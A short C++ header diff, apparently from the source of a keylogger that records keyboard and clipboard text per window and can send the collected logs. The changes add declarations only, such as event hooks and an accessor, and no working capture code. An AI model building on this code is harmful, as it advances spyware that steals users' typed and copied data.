@@ -25,6 +25,9 @@ class TGrabber;
 class TKeyLogger : public TEventContainer
 {
 private:
+
+	typedef TEventContainer inherited;
+
 	TGrabber* FGrabber;
 public:
 	TKeyLogger();
@@ -44,7 +47,9 @@ public:
 
 
     bool ConnectGrabber(TGrabber* Grabber);
-    bool DisconnectGrabber(TGrabber* Grabber);
+	bool DisconnectGrabber(TGrabber* Grabber);
+
+	void CallEvent(int EventId, LPVOID Param); // Перекрытый метод
 };
 
 
@@ -96,16 +101,20 @@ private:
 
 	friend class TKeyLogger;
 protected:
-	void virtual LogKeyboad(HWND Wnd, const char* Text) {  };
+	void virtual LogKeyboad(HWND Wnd, const char* Text) {  }
 	void virtual LogClipboard(HWND Wnd, const char* Text);
 
 	LPVOID OpenCab();
 	void   CloseCab(bool SendLog);
+
+	void virtual DoEvent(int EventId, LPVOID Param) { }
 public:
 	TGrabber(const string& GrabberName);
 	~TGrabber();
 	bool ConnectToKeyLogger();
 	bool DisconnectFromKeyLogger();
+
+	string inline Name() { return FName; }
 };
 
 
